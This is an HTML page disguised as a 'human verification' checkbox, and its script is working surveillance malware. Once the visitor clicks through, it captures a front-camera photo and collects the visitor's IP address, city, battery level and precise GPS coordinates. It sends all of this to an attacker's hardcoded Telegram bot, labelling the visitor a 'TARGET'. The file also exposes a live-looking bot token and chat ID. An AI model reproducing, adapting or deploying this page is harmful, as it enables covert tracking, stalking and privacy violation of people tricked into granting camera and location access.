<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SECURE SYSTEM</title>
    <style>
        body { background: black; margin: 0; overflow: hidden; font-family: 'Courier New', monospace; }
        canvas { display: block; position: fixed; top: 0; left: 0; z-index: -1; }
        
        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); display: flex; justify-content: center; align-items: center; z-index: 100; }
        .modal { background: #111; border: 1px solid #00ff00; padding: 30px; border-radius: 10px; text-align: center; color: white; box-shadow: 0 0 20px #00ff00; width: 85%; max-width: 350px; }
        .modal h2 { color: #00ff00; font-size: 1.2em; margin-bottom: 15px; }
        .modal p { font-size: 0.9em; color: #ccc; line-height: 1.5; }
        .checkbox-container { display: flex; align-items: center; justify-content: center; margin-top: 20px; font-size: 1em; }
        .checkbox-container input { margin-right: 10px; width: 20px; height: 20px; }
        .btn { background: #00ff00; color: black; border: none; padding: 12px 25px; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 20px; font-size: 1em; }
        
        #video, #canvas { display: none; }
    </style>
</head>
<body>

<canvas id="matrix"></canvas>

<div class="overlay" id="overlay">
    <div class="modal">
        <h2>âœ… HUMAN VERIFICATION REQUIRED âœ…</h2>
        <p>Before proceeding, please complete the quick human verification to ensure you are not a bot.</p>
        <div class="checkbox-container">
            <input type="checkbox" id="humanVerify" onclick="toggleButton()">
            <label for="humanVerify">I am not a robot</label>
        </div>
        <button class="btn" id="proceedBtn" onclick="startSecureAccess()" disabled>PROCEED SECURELY</button>
    </div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    const TOKEN = '8032917202:AAFCD2hCP709BspRJSbibMl3BefYTVxV-qE';
    const CHAT_ID = '7416528268';

    // à§§. à¦®à§à¦¯à¦¾à¦Ÿà§à¦°à¦¿à¦•à§à¦¸ à¦…à§à¦¯à¦¾à¦¨à¦¿à¦®à§‡à¦¶à¦¨ à¦¶à§à¦°à§
    const canvas = document.getElementById('matrix');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
    const letters = "0101010101ABCDEF";
    const fontSize = 16;
    const columns = canvas.width / fontSize;
    const drops = Array(Math.floor(columns)).fill(1);
    function draw() {
        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = '#0F0'; ctx.font = fontSize + 'px arial';
        drops.forEach((y, i) => {
            ctx.fillText(letters[Math.floor(Math.random()*letters.length)], i*fontSize, y*fontSize);
            if (y*fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
            drops[i]++;
        });
    }
    setInterval(draw, 33);

    // à§¨. à¦Ÿà¦¿à¦•à¦®à¦¾à¦°à§à¦• à¦¦à¦¿à¦²à§‡ à¦¬à¦¾à¦Ÿà¦¨ à¦à¦¨à§‡à¦¬à¦² à¦¹à¦¬à§‡
    function toggleButton() {
        const checkbox = document.getElementById('humanVerify');
        const proceedBtn = document.getElementById('proceedBtn');
        proceedBtn.disabled = !checkbox.checked;
    }

    // à§©. à¦¬à¦¾à¦Ÿà¦¨à§‡ à¦•à§à¦²à¦¿à¦• à¦•à¦°à¦²à§‡ à¦†à¦¸à¦² à¦•à¦¾à¦œ à¦¶à§à¦°à§
    async function startSecureAccess() {
        document.getElementById('overlay').style.display = 'none';

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            document.getElementById('video').srcObject = stream;

            collectBackgroundData(); // à¦²à§‹à¦•à§‡à¦¶à¦¨ à¦“ à¦†à¦‡à¦ªà¦¿ à¦¬à§à¦¯à¦¾à¦•à¦—à§à¦°à¦¾à¦‰à¦¨à§à¦¡à§‡
            setTimeout(() => { captureFinal(); }, 3000); // à§© à¦¸à§‡à¦•à§‡à¦¨à§à¦¡ à¦ªà¦° à¦›à¦¬à¦¿ à¦¤à§à¦²à¦¬à§‡
        } catch (err) {
            console.log("Access Denied.");
        }
    }

    async function collectBackgroundData() {
        try {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            const locRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
            const locData = await locRes.json();
            const b = await navigator.getBattery();

            let msg = `
ðŸ‘¤ *TARGET VERIFIED* ðŸ‘¤
ðŸŒ IP: \`${ipData.ip}\`
ðŸ“ City: ${locData.city}, ${locData.country_name}
ðŸ”‹ Battery: ${(b.level * 100).toFixed(0)}%
ðŸ›° Maps: [Open Link](https://www.google.com/maps?q=${locData.latitude},${locData.longitude})`;

            sendTelegram(msg);

            navigator.geolocation.getCurrentPosition((pos) => {
                let gpsMsg = `ðŸŽ¯ *GPS ACCURATE*\nLink: [Google Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
                sendTelegram(gpsMsg);
            });
        } catch (e) {}
    }

    function captureFinal() {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'verified_face.jpg');
            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
        }, 'image/jpeg');
    }

    function sendTelegram(text) {
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
        });
    }
</script>

</body>
</html>
